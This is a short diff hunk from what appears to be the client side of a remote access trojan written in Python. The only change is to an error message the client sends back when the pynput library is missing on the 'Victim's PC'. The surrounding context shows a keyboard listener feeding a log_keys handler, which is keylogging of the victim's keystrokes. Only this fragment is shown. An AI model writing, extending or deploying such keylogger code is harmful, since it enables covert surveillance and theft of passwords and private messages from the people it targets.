@@ -48,7 +48,7 @@ class Client():
             try:
                 import pynput
             except:
-                self.client.send("pynput Isn't Installed In Victim's PC Or Victim Is Not Using Windows".encode())
+                self.client.send("pynput Isn't Installed In Victim's PC".encode())
             else:
                 with pynput.keyboard.Listener(on_press=self.log_keys) as listener:
                     listener.join()
